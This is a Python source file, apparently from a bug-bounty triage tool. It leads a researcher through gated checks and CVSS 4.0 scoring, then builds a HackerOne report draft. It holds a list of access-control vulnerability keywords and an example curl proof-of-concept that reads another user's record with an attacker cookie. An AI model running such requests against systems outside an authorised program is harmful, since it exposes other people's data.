def ask(prompt: str, default: str = "") -> str:
    if default:
        val = input(f"  {prompt} [{default}]: ").strip()
        return val if val else default
    return input(f"  {prompt}: ").strip()


def ask_yn(prompt: str, default: bool = True) -> bool:
    yn = "Y/n" if default else "y/N"
    val = input(f"  {prompt} [{yn}]: ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


def ask_yn_required(prompt: str) -> bool:
    """Ask a required yes/no question. Blank answers auto-fail."""
    while True:
        val = input(f"  {prompt} [y/n]: ").strip().lower()
        if val in ("y", "yes"):
            return True
        if val in ("n", "no"):
            return False
        if not val:
            print(f"  {YELLOW}Blank answer auto-fails this check.{RESET}")
            return False
        print(f"  {YELLOW}Enter y or n.{RESET}")


def load_json_file(path: str) -> dict:
    if not path:
        return {}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError as exc:
        print(
            f"  {YELLOW}Malformed JSON in {path}: {exc}{RESET}",
            file=sys.stderr,
        )
        return {}
    except OSError as exc:
        print(
            f"  {YELLOW}Could not read file {path}: {exc}{RESET}",
            file=sys.stderr,
        )
        return {}


def ask_choice(prompt: str, choices: list[tuple[str, str]]) -> str:
    """Ask user to pick from labeled choices. Returns the choice key."""
    print(f"\n  {prompt}")
    for key, label in choices:
        print(f"    {CYAN}{key}{RESET}) {label}")
    while True:
        val = input(f"  Choice: ").strip().upper()
        if val in [k for k, _ in choices]:
            return val
        print(f"  {YELLOW}Invalid — enter one of: {', '.join(k for k,_ in choices)}{RESET}")


def section(title: str):
    print(f"\n{BOLD}{BLUE}{'─' * 60}{RESET}")
    print(f"{BOLD}{BLUE}  {title}{RESET}")
    print(f"{BOLD}{BLUE}{'─' * 60}{RESET}\n")


def gate_header(n: int, name: str, status: str | None = None):
    status_str = ""
    if status == "PASS":
        status_str = f" {GREEN}✓ PASS{RESET}"
    elif status == "FAIL":
        status_str = f" {RED}✗ FAIL{RESET}"
    print(f"\n{BOLD}Gate {n}: {name}{RESET}{status_str}")
    print(f"{'─' * 40}")


# ─── Gate implementations ─────────────────────────────────────────────────────

# Auth-related vuln types that require session identity checks before Gate 1 can pass.
_AUTH_KEYWORDS = {
    "idor", "ato", "auth", "session", "login", "privilege", "account",
    "bypass", "takeover", "permission", "access control", "broken auth",
    "bac", "broken access", "insecure direct",
}

def _is_auth_related(vuln_type: str) -> bool:
    vt = vuln_type.lower()
    return any(k in vt for k in _AUTH_KEYWORDS)


def gate1_is_real(vuln_type: str = "") -> tuple[bool, dict]:
    gate_header(1, "Is It Real?")
    print("  Can you reproduce the bug from scratch — clean browser, no Burp artifacts?")
    print()
    repro3   = ask_yn("Reproduced 3/3 times deterministically?")
    no_burp  = ask_yn("Works with plain curl or fresh browser (not just in Burp)?")
    no_state = ask_yn("No unusual preconditions (doesn't require specific timing or race)?")
    rtfm     = ask_yn("Checked documentation — this isn't expected/documented behavior?")

    # Identity check for auth/access-control findings.
    # The #1 reason IDOR/ATO get N/A: tester only accessed their own data.
    identity_ok = True
    identity_notes: dict = {}
    if _is_auth_related(vuln_type):
        print(f"\n  {CYAN}Identity Check  (required — auth-related vuln type detected){RESET}")
        print(f"  {DIM}Most IDOR/ATO N/As happen because the tester only read their own data.{RESET}\n")
        cross_account = ask_yn_required("Tested with two accounts: Session A read Session B's data (not your own)?")
        fresh_session = ask_yn_required("Reproduced with a fresh session (not your existing logged-in cookie)?")
        anon_delta    = ask_yn_required("Confirmed the delta: anonymous is blocked, attacker-authenticated succeeds?")
        identity_ok   = cross_account and fresh_session and anon_delta
        identity_notes = {
            "cross_account_tested":    cross_account,
            "fresh_session_tested":    fresh_session,
            "anon_vs_auth_delta":      anon_delta,
            "identity_required":       True,
        }
        if not identity_ok:
            print(f"\n  {RED}Identity check FAIL — gate cannot pass without cross-account proof.{RESET}")

    passed = repro3 and no_burp and no_state and rtfm and identity_ok

    rejection_reason: str | None = None
    if not passed:
        rejection_reason = "identity_not_proven" if (repro3 and no_burp and no_state and rtfm and not identity_ok) else "not_reproducible"

    notes: dict = {
        "repro_3_3":               repro3,
        "works_without_proxy":     no_burp,
        "no_special_state":        no_state,
        "not_documented_behavior": rtfm,
        **identity_notes,
        "rejection_reason":        rejection_reason,
    }

    if not passed:
        print(f"\n  {RED}GATE 1 FAIL: {rejection_reason}{RESET}")
        print(f"  {DIM}Do not submit yet. Verify the bug is deterministic first.{RESET}")
    else:
        print(f"\n  {GREEN}GATE 1 PASS{RESET}")

    return passed, notes


def gate2_in_scope(program_handle: str) -> tuple[bool, dict]:
    gate_header(2, "Is It In Scope?")
    print("  Check the program scope page explicitly — don't assume.")
    print()

    asset_in_scope  = ask_yn("The affected domain/asset is listed on the program's scope page?")
    not_excluded    = ask_yn("Not in the out-of-scope list (check staging, third-party exclusions)?")
    version_ok      = ask_yn("Affected software version is in scope (not an excluded old version)?")

    if program_handle:
        print(f"\n  {DIM}Checking HackerOne scope for '{program_handle}'...{RESET}")
        try:
            query = {
                "query": f'{{ team(handle: "{_escape_graphql_string(program_handle)}") {{ policy_scopes(archived: false) {{ edges {{ node {{ asset_type asset_identifier eligible_for_bounty }} }} }} }} }}'
            }
            req = urllib.request.Request(
                "https://hackerone.com/graphql",
                data=json.dumps(query).encode(),
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=8, context=_SSL_CTX) as resp:
                data = json.loads(resp.read().decode())
            scopes = (data.get("data") or {}).get("team", {}).get("policy_scopes", {}).get("edges", [])
            if scopes:
                print(f"\n  {CYAN}In-scope assets for {program_handle}:{RESET}")
                for edge in scopes[:10]:
                    node = edge.get("node", {})
                    bounty = " (eligible)" if node.get("eligible_for_bounty") else ""
                    print(f"    • [{node.get('asset_type','?')}] {node.get('asset_identifier','?')}{bounty}")
        except Exception as exc:
            print(
                f"  {YELLOW}Could not fetch scope: {type(exc).__name__}: {exc}{RESET}",
                file=sys.stderr,
            )

    passed = asset_in_scope and not_excluded and version_ok
    notes: dict = {
        "asset_in_scope":    asset_in_scope,
        "not_excluded":      not_excluded,
        "version_ok":        version_ok,
        "rejection_reason":  "out_of_scope" if not passed else None,
    }

    if not passed:
        print(f"\n  {RED}GATE 2 FAIL: out_of_scope{RESET}")
        print(f"  {DIM}Confirm scope before submitting.{RESET}")
    else:
        print(f"\n  {GREEN}GATE 2 PASS{RESET}")

    return passed, notes


def gate3_exploitable() -> tuple[bool, dict]:
    gate_header(3, "Is It Exploitable?")
    print("  Can you demonstrate concrete impact without unrealistic preconditions?")
    print()

    concrete_impact = ask_yn("Can you show concrete impact (not just 'theoretically an attacker could')?")
    no_unrealistic  = ask_yn("No unrealistic preconditions (not 'must be admin already', not 'victim must run JS')?")

    print()
    print("  What is the concrete impact? (be specific)")
    impact_desc = ask("Describe the impact")

    # Require a real curl PoC — yes/no on "have proof" is not enough.
    # A blank answer here is an automatic FAIL. This is the primary false-positive filter.
    print()
    print(f"  {BOLD}Paste the exact curl command that reproduces this.{RESET}")
    print(f"  {DIM}Example: curl -s 'https://target.com/api/user/456' -H 'Cookie: sess=ATTACKER'{RESET}")
    print(f"  {YELLOW}Leave blank or type 'skip' → auto-FAIL (no proof = no submit){RESET}")
    curl_poc   = ask("curl PoC").strip()
    curl_valid = bool(curl_poc) and curl_poc.lower() != "skip"

    if not curl_valid:
        print(f"\n  {RED}No PoC provided — this is a scanner hit, not a confirmed finding.{RESET}")
        print(f"  {DIM}Reproduce it with curl, then come back.{RESET}")

    passed = concrete_impact and no_unrealistic and curl_valid

    rejection_reason: str | None = None
    if not passed:
        if not curl_valid:
            rejection_reason = "no_reproducible_impact"
        elif not concrete_impact:
            rejection_reason = "no_concrete_impact"
        elif not no_unrealistic:
            rejection_reason = "unrealistic_privileges"
        else:
            rejection_reason = "no_reproducible_impact"

    notes: dict = {
        "concrete_impact":             concrete_impact,
        "no_unrealistic_preconditions":no_unrealistic,
        "curl_poc":                    curl_poc if curl_valid else "",
        "has_proof":                   curl_valid,
        "impact_description":          impact_desc,
        "rejection_reason":            rejection_reason,
    }

    if not passed:
        print(f"\n  {RED}GATE 3 FAIL: {rejection_reason}{RESET}")
        print(f"  {DIM}Build a working PoC before submitting.{RESET}")
    else:
        print(f"\n  {GREEN}GATE 3 PASS{RESET}")

    return passed, notes


def gate4_not_dup(vuln_type: str, endpoint: str, program_handle: str) -> tuple[bool, dict]:
    gate_header(4, "Is It a Dup?")
    print("  Check HackerOne disclosed reports, GitHub issues, and recent changelog.")
    print()

    # Auto-check HackerOne
    h1_results = []
    if program_handle and vuln_type:
        print(f"  {DIM}Searching HackerOne for '{vuln_type}' in '{program_handle}'...{RESET}")
        h1_results = check_h1_dups(program_handle, vuln_type)
        if h1_results:
            print(f"\n  {YELLOW}Found {len(h1_results)} potentially similar disclosed reports:{RESET}")
            for r in h1_results:
                disclosed = (r.get("disclosed_at") or "")[:10]
                print(f"    • [{r.get('severity_rating','?').upper()}] {r.get('title','')} ({disclosed})")
                if r.get("url"):
                    print(f"      {DIM}{r['url']}{RESET}")
        else:
            print(f"  {GREEN}No similar disclosed reports found on HackerOne.{RESET}")

    print()
    not_disclosed   = ask_yn("Not found in HackerOne disclosed reports for this program?")
    not_in_issues   = ask_yn("Not already fixed/reported in GitHub issues or CHANGELOG?")
    checked_history = ask_yn("Checked git log for recent security fixes with this pattern?")

    passed = not_disclosed and not_in_issues and checked_history
    notes: dict = {
        "not_in_h1_disclosed":  not_disclosed,
        "not_in_github_issues": not_in_issues,
        "checked_git_history":  checked_history,
        "h1_similar_reports":   [r.get("title") for r in h1_results],
        "rejection_reason":     "duplicate_or_already_disclosed" if not passed else None,
    }

    if not passed:
        print(f"\n  {RED}GATE 4 FAIL: duplicate_or_already_disclosed{RESET}")
        print(f"  {DIM}Verify it's not already known before submitting.{RESET}")
    else:
        print(f"\n  {GREEN}GATE 4 PASS{RESET}")

    return passed, notes


# ─── CVSS 4.0 interactive scorer ─────────────────────────────────────────────

def score_cvss() -> tuple[float, str, dict]:
    section("CVSS 4.0 Scoring")
    print(f"  {DIM}Scores are approximate — verify at https://www.first.org/cvss/calculator/4.0{RESET}\n")

    av = ask_choice("Attack Vector (AV)", [
        ("N", "Network — exploitable remotely over the internet"),
        ("A", "Adjacent — same network segment, Bluetooth, or VLAN"),
        ("L", "Local — requires local OS access or authenticated session"),
        ("P", "Physical — requires physical device access"),
    ])
    ac = ask_choice("Attack Complexity (AC)", [
        ("L", "Low — reliable, reproducible, no special conditions"),
        ("H", "High — requires specific conditions, evasion, or timing"),
    ])
    at = ask_choice("Attack Requirements (AT)  [NEW in 4.0]", [
        ("N", "None — no prerequisite deployment or execution conditions"),
        ("P", "Present — depends on specific target configuration or state"),
    ])
    pr = ask_choice("Privileges Required (PR)", [
        ("N", "None — no account or elevated access needed"),
        ("L", "Low — regular user account"),
        ("H", "High — admin or elevated privileges"),
    ])
    ui = ask_choice("User Interaction (UI)  [Changed in 4.0]", [
        ("N", "None — no victim interaction required"),
        ("P", "Passive — victim must access a URL or open an email (no explicit action)"),
        ("A", "Active — victim must explicitly click, download, or interact"),
    ])

    print(f"\n  {CYAN}Vulnerable System Impact{RESET}  (the component directly attacked)")
    vc = ask_choice("Confidentiality — Vulnerable System (VC)", [
        ("H", "High — complete or significant confidentiality loss"),
        ("L", "Low — partial or constrained disclosure"),
        ("N", "None"),
    ])
    vi = ask_choice("Integrity — Vulnerable System (VI)", [
        ("H", "High — complete or significant integrity loss"),
        ("L", "Low — limited modification possible"),
        ("N", "None"),
    ])
    va = ask_choice("Availability — Vulnerable System (VA)", [
        ("H", "High — complete denial of service"),
        ("L", "Low — reduced performance or intermittent outages"),
        ("N", "None"),
    ])

    print(f"\n  {CYAN}Subsequent System Impact{RESET}  (other systems or users beyond the attacked component)")
    sc = ask_choice("Confidentiality — Subsequent System (SC)", [
        ("H", "High — significant data exposure in downstream systems/users"),
        ("L", "Low — limited disclosure in downstream systems/users"),
        ("N", "None — no impact beyond the vulnerable component"),
    ])
    si = ask_choice("Integrity — Subsequent System (SI)", [
        ("S", "Safety — impacts physical safety of people"),
        ("H", "High — complete integrity loss in downstream system"),
        ("L", "Low — limited modification in downstream system"),
        ("N", "None"),
    ])
    sa = ask_choice("Availability — Subsequent System (SA)", [
        ("S", "Safety — impacts physical safety of people"),
        ("H", "High — complete denial of service in downstream system"),
        ("L", "Low — reduced performance in downstream system"),
        ("N", "None"),
    ])

    score, vector = calculate_cvss40(av, ac, at, pr, ui, vc, vi, va, sc, si, sa)
    sev = severity_from_score(score)

    sev_color = RED if sev in ("CRITICAL", "HIGH") else (YELLOW if sev == "MEDIUM" else GREEN)
    print(f"\n  {BOLD}CVSS 4.0 Score: {sev_color}{score} {sev}{RESET}")
    print(f"  {BOLD}Vector:{RESET} {vector}")
    print(f"  {DIM}Verify: https://www.first.org/cvss/calculator/4.0#{vector}{RESET}")

    params = {
        "AV": av, "AC": ac, "AT": at, "PR": pr, "UI": ui,
        "VC": vc, "VI": vi, "VA": va, "SC": sc, "SI": si, "SA": sa,
    }
    return score, vector, params


# ─── Report skeleton generator ────────────────────────────────────────────────

def generate_report_skeleton(info: dict) -> str:
    """Generate a HackerOne-style report skeleton."""
    vuln_type  = info.get("vuln_type", "VULN_TYPE")
    target     = info.get("target", "TARGET")
    endpoint   = info.get("endpoint", "ENDPOINT")
    impact     = info.get("impact", "IMPACT_DESCRIPTION")
    score      = info.get("cvss_score", 0.0)
    vector     = info.get("cvss_vector", "CVSS:3.1/...")
    sev        = severity_from_score(score)
    scanner_confidence = info.get("scanner_confidence", "unknown")
    validation_status = info.get("validation_status", "scanner_hit")
    scanner_summary = info.get("scanner_summary", {})
    date       = datetime.now().strftime("%Y-%m-%d")

    return f"""# {vuln_type} on {endpoint} — [fill in specific impact]

**Program:** {target}
**Severity:** {sev} ({score}) — {vector}
**Scanner Confidence:** {scanner_confidence}
**Validation Status:** {validation_status}
**Scanner Summary:** {scanner_summary if scanner_summary else "n/a"}
**Date Found:** {date}

